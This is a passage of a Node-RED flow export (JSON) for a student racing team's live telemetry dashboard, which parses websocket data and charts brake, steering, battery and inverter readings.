        "id": "54e93291be58e916",
        "type": "websocket in",
        "z": "bad166ee0ebb9845",
        "name": "",
        "server": "",
        "client": "b3e921438611f1ef",
        "x": 140,
        "y": 220,
        "wires": [
            [
                "debe97f7e8a3221d"
            ]
        ]
    },
    {
        "id": "debe97f7e8a3221d",
        "type": "json",
        "z": "bad166ee0ebb9845",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 330,
        "y": 220,
        "wires": [
            [
                "d1bbbcae4a734f0b",
                "641f902ce1923583",
                "39dbab2fc89f5d49",
                "a7440d87e40ac55d",
                "57f659bb1282a1ca",
                "3af5865105a244bc",
                "ae03c4bd8d214079",
                "5c394eecd76bb97a",
                "8619593675ce1ac5",
                "1de158ca2b5f3152",
                "2c4f88ca1fc1e02e",
                "08a809ba4e12ea62",
                "7401d7e2aa81255c",
                "549e43f00d1f67a7"
            ]
        ]
    },
    {
        "id": "415f834d18246dda",
        "type": "remote-access",
        "z": "bad166ee0ebb9845",
        "confignode": "5cf783589dfd8573",
        "name": "",
        "verbose": 0,
        "x": 120,
        "y": 400,
        "wires": [
            [],
            []
        ]
    },
    {
        "id": "181cd1937b51a940",
        "type": "ui-text",
        "z": "bad166ee0ebb9845",
        "group": "ead6d96fd98bb5ec",
        "order": 2,
        "width": "0",
        "height": "0",
        "name": "",
        "label": "Server Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-center",
        "style": false,
        "font": "",
        "fontSize": 16,
        "color": "#717171",
        "className": "",
        "x": 630,
        "y": 660,
        "wires": []
    },
    {
        "id": "d1bbbcae4a734f0b",
        "type": "function",
        "z": "bad166ee0ebb9845",
        "name": "Extract Server Info",
        "func": "var precision = 2; // digits past decimal point\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar server_latency =\n{\n    topic: \"Server_Info\",\n    payload: msg.payload.Latency\n}\ntry {\n    server_latency.payload = server_latency.payload.toFixed(precision)\n} catch { }\n\nvar total_latency = \n{\n    topic: \"Server_Info\",\n    payload: ((timestamp / 1000) - msg.payload.Arduino_Time)\n}\ntry {\n    total_latency.payload = total_latency.payload.toFixed(precision)\n} catch { }\n\nvar Failsafe_Statuses =\n{\n    topic: \"Failsafe Statuses\",\n    payload: msg.payload.Failsafe_Statuses\n}\ntry {\n    Failsafe_Statuses.payload = Failsafe_Statuses.payload.toFixed(precision)\n} catch { }\n\n\nreturn [\n    server_latency,\n    total_latency,\n    Failsafe_Statuses\n];",
        "outputs": 3,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 430,
        "y": 680,
        "wires": [
            [
                "181cd1937b51a940"
            ],
            [
                "122be3eb7e92c56e"
            ],
            [
                "d24ec5ff0501fba7"
            ]
        ]
    },
    {
        "id": "122be3eb7e92c56e",
        "type": "ui-text",
        "z": "bad166ee0ebb9845",
        "group": "ead6d96fd98bb5ec",
        "order": 4,
        "width": "0",
        "height": "0",
        "name": "",
        "label": "Total Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-center",
        "style": false,
        "font": "",
        "fontSize": 16,
        "color": "#717171",
        "className": "",
        "x": 630,
        "y": 700,
        "wires": []
    },
    {
        "id": "641f902ce1923583",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "009c8c030a956a93",
        "name": "",
        "label": "Brake Pressure",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "VCU_brakePressureSensorDiag",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 620,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "39dbab2fc89f5d49",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "009c8c030a956a93",
        "name": "Brake Bias Aim",
        "label": "Brake Bias Aim",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "VCU_brakeBiasAim",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 620,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
        "id": "a7440d87e40ac55d",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "009c8c030a956a93",
        "name": "Steering Angle",
        "label": "Steering Angle",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Rad",
        "yAxisProperty": "VCU_steeringAngle",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 620,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "57f659bb1282a1ca",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "009c8c030a956a93",
        "name": "Vehicle Speed",
        "label": "Vehicle Speed",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "VCU_vehicleSpeed",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 620,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "3af5865105a244bc",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "011e8be3a2ac904a",
        "name": "Pack Current",
        "label": "Pack Current",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "Pack_Current",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 610,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "79eeff763fa8ab9f",
        "type": "ui-markdown",
        "z": "bad166ee0ebb9845",
        "group": "ead6d96fd98bb5ec",
        "name": "",
        "order": 1,
        "width": 0,
        "height": 0,
        "content": "# Panther Racing Live Telemetry",
        "className": "",
        "x": 310,
        "y": 80,
        "wires": [
            []
        ]
    },
    {
        "id": "b1eaf60362e58a03",
        "type": "function",
        "z": "bad166ee0ebb9845",
        "name": "function 6",
        "func": "var sigFigs = 2;\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar VCU_brakePressureSensorDiag =\n{\n    topic: \"Brake Pressure\",\n    payload: msg.payload.VCU_brakePressureSensorDiag\n}\ntry {\n    VCU_brakePressureSensorDiag.payload = VCU_brakePressureSensorDiag.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_brakeBiasAim =\n{\n    topic: \"Brake Bias Aim (ratio)\",\n    payload: msg.payload.VCU_brakeBiasAim\n}\ntry {\n    VCU_brakeBiasAim.payload = VCU_brakeBiasAim.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_steeringAngle =\n{\n    topic: \"Steering Angle (deg)\",\n    payload: msg.payload.VCU_steeringAngle\n}\ntry {\n    VCU_steeringAngle.payload = VCU_steeringAngle.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_vehicleSpeed =\n{\n    topic: \"Vehicle Speed (km/hr)\",\n    payload: msg.payload.VCU_vehicleSpeed\n}\ntry {\n    VCU_vehicleSpeed.payload = VCU_vehicleSpeed.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Current =\n{\n    topic: \"Pack Current (A)\",\n    payload: msg.payload.Pack_Current\n}\ntry {\n    Pack_Current.payload = Pack_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Temperature =\n{\n    topic: \"High Temperature (ºC)\",\n    payload: msg.payload.High_Temperature\n}\ntry {\n    High_Temperature.payload = High_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload.Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload.Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (aH)\",\n    payload: msg.payload.Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Failsafe_Statuses =\n{\n    topic: \"Failsafe Statuses\",\n    payload: msg.payload.Failsafe_Statuses\n}\ntry {\n    Failsafe_Statuses.payload = Failsafe_Statuses.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Motor_Speed =\n{\n    topic: \"INV Motor Speed (deg/s)\",\n    payload: msg.payload.INV_Motor_Speed\n}\ntry {\n    INV_Motor_Speed.payload = INV_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Motor_Temp =\n{\n    topic: \"INV Motor Temperature (ºC)\",\n    payload: msg.payload.INV_Motor_Temp\n}\ntry {\n    INV_Motor_Temp.payload = INV_Motor_Temp.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Torque_Feedback =\n{\n    topic: \"INV Torque Feedback (N*m)\",\n    payload: msg.payload.INV_Torque_Feedback\n}\ntry {\n    INV_Torque_Feedback.payload = INV_Torque_Feedback.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Commanded_Torque =\n{\n    topic: \"INV Command Torque (N*m)\",\n    payload: msg.payload.INV_Commanded_Torque\n}\ntry {\n    INV_Commanded_Torque.payload = INV_Commanded_Torque.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_DC_Bus_Voltage =\n{\n    topic: \"Inverter DC Bus Voltage (V)\",\n    payload: msg.payload.INV_DC_Bus_Voltage\n}\ntry {\n    INV_DC_Bus_Voltage.payload = INV_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Latency =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Latency\n}\ntry {\n    Latency.payload = Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Total_Latency =\n{\n    topic: \"Total Latency (s)\",\n    payload: (timestamp - msg.payload.Arduino_Time)\n}\ntry {\n    Total_Latency.payload = Total_Latency.payload/1000\n    Total_Latency.payload = Total_Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Message_num =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Counter\n}\ntry {\n    Message_num.payload = Message_num.payload.toFixed(sigFigs)\n} catch { }\n\nvar Messages_lost =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Lost_packages\n}\ntry {\n    Messages_lost.payload = Messages_lost.payload.toFixed(sigFigs)\n} catch { }\n\nvar Percent_lost =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Percent_lost\n}\ntry {\n    Percent_lost.payload = Percent_lost.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    VCU_brakePressureSensorDiag,\n    VCU_brakeBiasAim,\n    VCU_steeringAngle,\n    VCU_vehicleSpeed,\n    Pack_Current,\n    High_Temperature,\n    Low_Temperature,\n    Pack_Open_Voltage,\n    Pack_Amphours,\n    Failsafe_Statuses,\n    INV_Motor_Speed,\n    INV_Motor_Temp,\n    INV_Torque_Feedback,\n    INV_Commanded_Torque,\n    INV_DC_Bus_Voltage,\n    Latency,\n    Total_Latency,\n    Message_num,\n    Messages_lost,\n    Percent_lost\n];",
        "outputs": 20,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1420,
        "y": 320,
        "wires": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "id": "744caf0dbe1f80ab",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "011e8be3a2ac904a",
        "name": "High/Low Battery Temps",
        "label": "High/Low Battery Temps",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "property",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "payload",
        "yAxisPropertyType": "msg",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": true,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 910,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "ae03c4bd8d214079",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "011e8be3a2ac904a",
        "name": "Pack Open Voltage",
        "label": "Pack Open Voltage",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "Pack_Open_Voltage",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 630,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "5c394eecd76bb97a",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "011e8be3a2ac904a",
        "name": "Pack Amp Hours",
        "label": "Pack Amp Hours",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "Pack_Amphours",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 630,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "8619593675ce1ac5",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "397c7fd766338998",
        "name": "Motor Speed",
        "label": "Motor Speed",
        "order": 1,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "INV_Motor_Speed",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 610,
        "y": 380,
        "wires": [
            []
        ]
    },
    {
        "id": "1de158ca2b5f3152",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "397c7fd766338998",
        "name": "Motor Temp",
        "label": "Motor Temperature",
        "order": 2,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "INV_Motor_Temp",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 610,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "2c4f88ca1fc1e02e",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "397c7fd766338998",
        "name": "INV DC Bus Voltage",
        "label": "Inverter DC Bus Voltage",
        "order": 3,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Volts",
        "yAxisProperty": "INV_DC_Bus_Voltage",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 640,
        "y": 460,
        "wires": [
            []
        ]
    },
    {
        "id": "08a809ba4e12ea62",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "397c7fd766338998",
        "name": "Torque Feedback",
        "label": "Torque Feedback",
        "order": 4,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "",
        "yAxisProperty": "INV_Torque_Feedback",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 630,
        "y": 500,
        "wires": [
            []
        ]
    },
    {
        "id": "7401d7e2aa81255c",
        "type": "ui-chart",
        "z": "bad166ee0ebb9845",
        "group": "397c7fd766338998",
        "name": "Command Torque",
        "label": "Command Torque",
        "order": 5,
        "chartType": "line",
        "category": "topic",
        "categoryType": "msg",
        "xAxisLabel": "",
        "xAxisProperty": "",
        "xAxisPropertyType": "timestamp",
        "xAxisType": "time",
        "xAxisFormat": "",
        "xAxisFormatType": "auto",
        "xmin": "",
        "xmax": "",
        "yAxisLabel": "Amps",
        "yAxisProperty": "INV_Commanded_Torque",
        "yAxisPropertyType": "property",
        "ymin": "",
        "ymax": "",
        "bins": 10,
        "action": "append",
        "stackSeries": false,
        "pointShape": "circle",
        "pointRadius": 4,
        "showLegend": false,
        "removeOlder": "5",
        "removeOlderUnit": "60",
        "removeOlderPoints": "",
        "colors": [
            "#0095ff",
            "#ff0000",
            "#ff7f0e",
            "#2ca02c",
            "#a347e1",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "textColor": [
            "#666666"
        ],
        "textColorDefault": true,
        "gridColor": [
            "#e5e5e5"
        ],
        "gridColorDefault": true,
        "width": 6,
        "height": "6",
        "className": "",
        "x": 630,
        "y": 540,
        "wires": [
            []
        ]
    },
    {
        "id": "d24ec5ff0501fba7",
        "type": "ui-text",
        "z": "bad166ee0ebb9845",
        "group": "ead6d96fd98bb5ec",
        "order": 3,
        "width": "0",
        "height": "0",
        "name": "Failsafe status",
        "label": "FAILSAFE STATUS: ",
        "format": "{{msg.payload}}",
        "layout": "row-center",
        "style": false,
        "font": "",
        "fontSize": 16,
        "color": "#717171",
        "className": "",
        "x": 620,
        "y": 740,
        "wires": []
    },
    {
        "id": "6bf1df03d9331351",
        "type": "comment",
        "z": "bad166ee0ebb9845",
        "name": "TODO",
        "info": "TODO move latency and Failsafe status to markdown\n",
        "x": 350,
        "y": 40,
        "wires": []
    },
    {
        "id": "549e43f00d1f67a7",
        "type": "function",
        "z": "bad166ee0ebb9845",
        "name": "Extract Temps",
        "func": "var high_temp = msg.payload.High_Temperature;\nvar low_temp = msg.payload.Low_Temperature;\n\n\nvar highTemp = {\n    topic: \"high_temp\",\n    payload: msg.payload.High_Temperature\n}\n\nvar lowTemp = {\n    topic: \"low_temp\",\n    payload: msg.payload.Low_Temperature\n}\n\nreturn [\n    highTemp,\n    lowTemp\n]",
        "outputs": 2,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 620,
        "y": 260,
        "wires": [
            [
                "744caf0dbe1f80ab",
                "be8e2c42523f3788"
            ],
            [
                "744caf0dbe1f80ab",
                "be8e2c42523f3788"
            ]
        ]
    },
    {
        "id": "be8e2c42523f3788",
        "type": "debug",
        "z": "bad166ee0ebb9845",
        "name": "debug 2",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "true",
        "targetType": "full",
        "statusVal": "",
        "statusType": "auto",
        "x": 840,
        "y": 340,
        "wires": []
    },
    {
        "id": "aca4edd8df547293",
        "type": "join",
        "z": "bad166ee0ebb9845",
        "name": "",
        "mode": "auto",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": "false",
        "timeout": "",
        "count": "",
        "reduceRight": false,
        "x": 870,
        "y": 160,
        "wires": [
            []
        ]
    },
    {
        "id": "76e1a5bd576e57b1",
        "type": "websocket in",
        "z": "bda8997ed28d204b",
        "name": "",
        "server": "",
        "client": "b3e921438611f1ef",
        "x": 120,
        "y": 700,
        "wires": [
            [
                "e22c1945abd93c41"
            ]
        ]
    },
    {
        "id": "e22c1945abd93c41",
        "type": "json",
        "z": "bda8997ed28d204b",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 310,
        "y": 700,
        "wires": [
            [
                "13d71bb7f16c65e9",
                "557b9f4fe55d5ec2",
                "c1163f0b60643b21",
                "2753126cdf2252d4",
                "66377126a799b334",
                "a69c8feea8c6bcfe",
                "68ca2255ec5ef83f",
                "efd9825c65b14baf",
                "d860a06f83f452b9",
                "56d3c93f4005e399",
                "c830897274863c4b",
                "7bd08d25b2b041f8",
                "606b0b3234cf3275",
                "4e10722b5264861a",
                "1afb5881eb699eed",
                "65f63b99ceb9a45c",
                "f351e755d3dc9eb8",
                "dbc529a55d6f97b9",
                "0eee0b6269880af3"
            ]
        ]
    },
    {
        "id": "13d71bb7f16c65e9",
        "type": "function",
        "z": "bda8997ed28d204b",
        "name": "Extract Ref Voltages",
